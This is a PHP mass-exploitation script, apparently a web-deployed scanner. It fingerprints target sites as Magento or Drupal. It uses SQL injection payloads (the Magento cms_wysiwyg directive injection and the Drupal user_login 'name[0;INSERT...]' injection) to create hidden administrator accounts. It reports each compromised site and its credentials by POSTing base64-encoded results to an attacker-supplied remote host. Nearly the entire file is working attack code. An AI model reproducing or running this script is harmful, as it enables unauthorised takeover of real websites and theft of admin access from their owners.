<?php

ignore_user_abort(true);
set_time_limit(0);

function send_result($txt,$sn){
if ($sn=='http://test'){
echo $txt;
} else {
$ch = curl_init($sn);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"gl=".urlencode(base64_encode($txt)));
$data = curl_exec($ch);
curl_close($ch);
}
return "ok";
}

function test($url,$ids,$name) {
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
curl_setopt($ch, CURLOPT_POST, 1);
$post_data = "name[0;INSERT INTO users (uid, name, pass,status) values ('".$ids."','".$name."', '%24S%24DrV4X74wt6bT3BhJa4X0.XO5bHXl%2FQBnFkdDkYSHj3cE1Z5clGwu','1');INSERT INTO users_roles (uid, rid) values ('".$ids."','3');#]=".$name."&name[]=".$name."&pass=admin&form_build_id=&form_id=user_login&op=Log+in";    
curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data);
$data = curl_exec($ch);
curl_close($ch); 
$redirectURLd='';
if(preg_match('#Location: (.*)#', $data, $r)){
$redirectURLd = trim($r[1]);
if ((isset($redirectURLd)) && (trim($redirectURLd)!=="")) {return test($redirectURLd,$ids,$name);} 
} else { if (stristr($data, 'user/'.$ids)) {return "<drpi>".$url.":".$name.":".$ids."</drpi>";} else {return 'no';}}}

function do_magic($url,$usr,$pwd) {

if (file_exists('1.txt')){unlink('1.txt');}
$ch = curl_init($url.'index.php/admin/cms_wysiwyg/directive/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, '1.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, '1.txt');

$filter=urlencode(base64_encode("popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`is_active`) VALUES ('Adm".$usr."','Administrator','".$usr."@magentoadmin.com','".$usr."',MD5('".$pwd."'),1); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '".$usr."'),'Adm".$usr."');"));
$post_data = "forwarded=1&___directive=e3tibG9jayB0eXBlPSdNYWdlX0FkbWluaHRtbF9CbG9ja19SZXBvcnRfU2VhcmNoX0dyaWQnIG91dHB1dD0nZ2V0Q3N2RmlsZSd9fQ%3D%3D&filter=".$filter;    
curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data);
$data = curl_exec($ch);
curl_close($ch); 

if (stristr($data, 'PNG')) {
$ch = curl_init($url.'index.php/admin/index');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_COOKIEJAR, '1.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, '1.txt');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
$data = curl_exec($ch);
curl_close($ch); 


if (preg_match('#name="form_key"(.*?)value="(.*?)"#', $data, $mtch)){

$formkey=$mtch[2];

$ch = curl_init($url.'index.php/admin/index');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");

curl_setopt($ch, CURLOPT_POST, 1);
$post_data = 'form_key='.$formkey.'&login[username]='.$usr.'&login[password]='.$pwd;   
curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data);
curl_setopt($ch, CURLOPT_COOKIEJAR, '1.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, '1.txt');

$data = curl_exec($ch);
curl_close($ch); 


if(preg_match('#Location: (.*)#', $data, $r)){if ((stristr(trim($r[1]), '/index.php/admin/index/index/key/')) || (stristr(trim($r[1]), '/index.php/admin/dashboard/index/key/'))) {return "<mag_good>".$url.":".$usr.":".$pwd."</mag_good>";} else { return "<mag_error_login1>".$url."</mag_error_login1>";}}
} else  {return "<mag_error_parse>".$url."</mag_error_parse>";}


} else  {return "<mag_error_exploit>".$url."</mag_error_exploit>";}}

function get_html_page($url) {
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch,CURLOPT_ENCODING , "");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1");
$data = curl_exec($ch);
curl_close($ch);

if(preg_match('#Location: (.*)#', $data, $r)){$redirectURL = trim($r[1]); if (trim($redirectURL)!=="") {return get_html_page($redirectURL);}} else { return array('url'=>$url,'data'=>$data);}}

function randomPassword($ln) {
    $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
    $pass = array(); 
    $alphaLength = strlen($alphabet) - 1; 
    for ($i = 0; $i < $ln; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}
if (isset($_REQUEST['urlg'])) {
$pl=base64_decode($_REQUEST['urlg']); } else {$pl='test';}


if (isset($_REQUEST['urls'])) {

$html = get_html_page('http://'.$_REQUEST['urls'].'/');
if ((isset($html['data'])) && (isset($html['url']))){

$lpath=parse_url($html['url']);
$html['url']=$lpath["scheme"]."://".$lpath["host"].rtrim($lpath["path"],'/').'/';

if (preg_match("#(src|href)=\"(http|https):\/\/(\S*?)(\/index.php\/rss\/catalog\/|\/skin\/frontend\/default\/)#", $html['data'], $matches)){
$textdata="<mag>".$html['url']."</mag>\n";
$textdata.="<magi>".do_magic($html['url'],'sys_'.strtolower(randomPassword(4))."_root",randomPassword(9))."</magi>";
send_result($textdata,'http://'.$pl);
} else {
if (preg_match("#\/sites\/all\/(modules|themes)\/#", $html['data'], $matches)){

$textdata="<drp>".$html['url']."</drp>\n";
$textdata.=test($html['url']."user/login",rand(1500, 3000),'adm_'.strtolower(randomPassword(4)).'sys');
send_result($textdata,'http://'.$pl);
}
} 
}
}

?>